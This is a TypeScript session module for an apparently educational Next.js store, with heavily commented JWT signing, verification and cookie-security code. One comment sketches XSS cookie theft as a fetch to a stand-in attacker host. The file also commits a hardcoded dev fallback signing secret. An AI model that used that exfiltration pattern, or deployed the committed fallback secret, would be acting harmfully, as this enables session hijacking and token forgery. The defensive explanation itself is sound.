// ─── lib/auth/session.ts ─────────────────────────────────────────────────
//
// Core session implementation using jose (JWS, HS256).
//
// SECURITY-SENSITIVE: changes here affect every authenticated route.
// Consult the security notes below before modifying.
//
// ── What this module does ───────────────────────────────────────────────────
//
//  createSession  — signs a JWT containing the user payload and writes it to
//                   an httpOnly cookie.
//  getSession     — reads the cookie, verifies the JWT signature and expiry,
//                   and returns the decoded session or null on any failure.
//  destroySession — deletes the cookie, ending the session.
//
// ── JWT choice (JWS HS256) vs alternatives ──────────────────────────────────
//
//  We use a SIGNED JWT (JWS) with HMAC-SHA256.  The token payload is NOT
//  encrypted — it is merely base64url-encoded.  This means anyone who reads
//  the cookie value can decode and read the payload, but they CANNOT forge or
//  tamper with it without knowing the signing secret.
//
//  For this teaching application, the payload holds only non-sensitive user
//  metadata (id, email, name, role) — nothing that would harm a user if read.
//  Were we storing anything more sensitive (e.g. a one-time token, a payment
//  method), we would upgrade to JWE (JSON Web Encryption) via EncryptJWT.
//
// ── Cookie security flags ────────────────────────────────────────────────────
//
//  httpOnly  — the browser's JavaScript engine cannot read the cookie.
//              Blocks the most common XSS cookie-theft pattern:
//              document.cookie / fetch(attacker.example/steal?c=...).
//              Without this flag, any injected script on the page can exfiltrate
//              the session token.
//
//  secure    — the cookie is only transmitted over HTTPS.  In development
//              (localhost) we skip this flag so the app works without TLS.
//              In production every session cookie travels over an encrypted
//              channel; without this flag an attacker on the network path
//              (e.g. a coffee-shop proxy or a misconfigured CDN) could intercept
//              the token and hijack the session.
//
//  sameSite=lax — the cookie is sent on top-level navigations (clicking a link
//              TO our site) but NOT on cross-origin sub-resource requests (img,
//              fetch, xhr from another origin).  This is the practical default
//              that blocks CSRF while still allowing OAuth redirect flows.
//              'strict' would also block same-site navigations from external
//              links, which breaks OAuth and "return to app" flows.
//              'none' requires secure and opens CSRF — never use for auth.
//
//  path=/    — scopes the cookie to the entire site.  Without this the cookie
//              is scoped to the current path and won't be sent on other routes.
//
// ── Signing secret ─────────────────────────────────────────────────────────
//
//  Read from process.env.SESSION_SECRET.  At minimum this should be a random
//  256-bit (32-byte) hex or base64 string.  Generate one with:
//    node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
//
//  DEV FALLBACK: If SESSION_SECRET is not set, a hardcoded 32-character dev
//  string is used.  This is deliberate and safe ONLY in a local dev
//  environment:
//    - The fallback is logged as a warning so developers notice it.
//    - The fallback value is committed to the repo — it MUST NOT be used in
//      production because an attacker who reads this source file can forge
//      tokens signed with it.
//    - The `secure` cookie flag is also off in development (NODE_ENV !== "production"),
//      so the surface is already localhost-only.
//
// ── NEVER ───────────────────────────────────────────────────────────────────
//  - Never log the signing secret or the raw JWT token.
//  - Never include sensitive fields (passwords, payment data) in SessionUser.
//  - Never weaken the cookie flags without updating this comment and the
//    security rationale above.

import { SignJWT, jwtVerify, errors as joseErrors } from "jose";
import { cookies } from "next/headers";
import type { Session, SessionUser } from "./types";

// ── Constants ────────────────────────────────────────────────────────────────

/** Name of the httpOnly cookie that carries the session JWT. */
const SESSION_COOKIE = "nextmart_session";

/**
 * Session lifetime in seconds (24 hours).
 *
 * Keep this short enough to limit the blast radius of a stolen token but long
 * enough to not frustrate users with constant re-logins.  For an
 * e-commerce learner app, 24 hours is a pragmatic default.
 */
const SESSION_DURATION_S = 60 * 60 * 24; // 24 hours

// ── Secret key ───────────────────────────────────────────────────────────────

/**
 * Returns a Uint8Array signing key from process.env.SESSION_SECRET.
 *
 * jose's SignJWT and jwtVerify accept raw Uint8Array for HMAC algorithms.
 * We encode the secret string as UTF-8 bytes; the important property is that
 * the same bytes are used for both signing and verification.
 *
 * DEV FALLBACK: a deterministic dummy secret is used when SESSION_SECRET is
 * absent from the environment.  This means unsigned tokens from the dev
 * environment cannot be replayed against production (different secret).
 *
 * This function is called only on the server side (inside Server Components
 * and Route Handlers) — it is never exported and never runs in the browser.
 */
function getSigningKey(): Uint8Array {
  const secret = process.env.SESSION_SECRET;

  if (!secret) {
    // Log once per cold start so developers see a clear warning.  We do NOT
    // include the fallback value in the log to avoid leaking it in aggregated
    // server logs if the warning is ever sent to an external log service.
    console.warn(
      "[auth] SESSION_SECRET is not set — using a hardcoded dev fallback. " +
        "This is ONLY safe on localhost. Set SESSION_SECRET in production."
    );
    // 32-character ASCII fallback — safe for localhost, insecure if deployed.
    return new TextEncoder().encode("dev-only-secret-do-not-deploy-1234");
  }

  return new TextEncoder().encode(secret);
}

// ── Public API ────────────────────────────────────────────────────────────────

/**
 * Creates a new session for the given user and writes it to the httpOnly
 * session cookie.
 *
 * Call this from a Route Handler or Server Action after successful
 * authentication.  The cookie is set via next/headers cookies() — this
 * function is server-only.
 *
 * Security: the token is signed with HS256 using the server-side signing key.
 * Any attempt to tamper with the payload (e.g. changing the role field) will
 * invalidate the signature and be rejected by getSession().
 */
export async function createSession(user: SessionUser): Promise<void> {
  // Validate that required fields are present.  Shallow guard only — callers
  // are responsible for validating the user object against the data layer.
  if (!user.id || !user.email) {
    throw new Error("[auth] createSession: user.id and user.email are required");
  }

  const now = Math.floor(Date.now() / 1000); // Unix seconds

  // Build and sign the JWT.
  // SignJWT builds a compact JWS (header.payload.signature).
  const token = await new SignJWT({
    // Only embed the minimal fields required for downstream auth decisions.
    // We deliberately avoid putting anything sensitive (e.g. a password hash,
    // a Stripe customer id, or a one-time token) in the payload.
    user: {
      id: user.id,
      email: user.email,
      name: user.name,
      role: user.role,
    } satisfies SessionUser,
  })
    .setProtectedHeader({ alg: "HS256" })
    .setIssuedAt(now) // "iat" — allows detecting abnormally old tokens
    .setExpirationTime(now + SESSION_DURATION_S) // "exp" — hard expiry
    .sign(getSigningKey());

  // Write the cookie.
  // Next.js 16 cookies() is async — we must await the cookieStore.
  const cookieStore = await cookies();
  cookieStore.set(SESSION_COOKIE, token, {
    httpOnly: true, // no JS access — blocks XSS theft
    secure: process.env.NODE_ENV === "production", // HTTPS-only in prod
    sameSite: "lax", // CSRF protection + OAuth-compatible
    path: "/", // available on all routes
    maxAge: SESSION_DURATION_S, // browser-level expiry in seconds
  });
}

/**
 * Reads and verifies the current session from the httpOnly cookie.
 *
 * Returns:
 *  - The decoded Session object if the token is present, valid, and unexpired.
 *  - null if the cookie is absent, the signature does not match, or the token
 *    has expired.
 *
 * This function NEVER throws — all failures are caught and return null, so
 * callers don't need a try/catch.  The only exception is genuinely unexpected
 * errors (e.g. out-of-memory), which we re-throw.
 *
 * Security: jwtVerify() validates:
 *   1. The HMAC-SHA256 signature (tamper detection).
 *   2. The "exp" claim (expiry).
 *   3. The algorithm header to prevent algorithm confusion attacks.
 */
export async function getSession(): Promise<Session | null> {
  // Read the raw cookie value.
  const cookieStore = await cookies();
  const raw = cookieStore.get(SESSION_COOKIE)?.value;

  // Fast path: no cookie at all.
  if (!raw) return null;

  try {
    // jwtVerify:
    //  - decodes the header and payload from base64url
    //  - recomputes the HMAC-SHA256 signature and compares it to the token's
    //    signature — any byte-level change to the payload fails here
    //  - checks exp claim — a token past its expiry is rejected automatically
    //  - the { algorithms: ["HS256"] } option prevents an attacker from sending
    //    a token with alg:none to bypass signature verification (algorithm
    //    confusion / CVE-2015-9235 class of vulnerabilities)
    const { payload } = await jwtVerify(raw, getSigningKey(), {
      algorithms: ["HS256"],
    });

    // Validate the payload shape before trusting it.
    // jwtVerify guarantees the signature, but we also guard against a
    // correctly-signed token that happens to have an unexpected payload shape
    // (e.g. an old token issued before a schema change).
    const user = payload.user as SessionUser | undefined;
    if (
      !user ||
      typeof user.id !== "string" ||
      typeof user.email !== "string" ||
      typeof user.name !== "string" ||
      (user.role !== "buyer" && user.role !== "seller")
    ) {
      return null;
    }

    // iat and exp are guaranteed to be numbers when jwtVerify succeeds and
    // the token was created by createSession (we set them explicitly).
    return {
      user,
      iat: payload.iat as number,
      exp: payload.exp as number,
    };
  } catch (err) {
    // JWTExpired, JWTSignatureInvalid, JWTMalformed, JWTInvalid etc. all
    // extend JOSEError.  We catch them silently and return null so callers
    // receive a clean "no session" result rather than an unhandled exception.
    if (err instanceof joseErrors.JOSEError) {
      // Do NOT log the raw token — it could leak PII (the payload is only
      // base64-encoded, not encrypted).
      return null;
    }
    // Re-throw genuinely unexpected errors (e.g. network failures,
    // type errors in our own code) so they surface in error monitoring.
    throw err;
  }
}

/**
 * Destroys the current session by deleting the session cookie.
 *
 * After this call, getSession() will return null for the current request
 * (the cookie is gone from the response headers).
 *
 * Note: There is no server-side token revocation list.  The token remains
 * cryptographically valid until its "exp" timestamp.  For this teaching
 * application that is acceptable.  A production system that needs immediate
 * revocation (e.g. "log out everywhere") would need a blocklist in Redis or
 * a database.
 */
export async function destroySession(): Promise<void> {
  const cookieStore = await cookies();
  cookieStore.delete(SESSION_COOKIE);
}
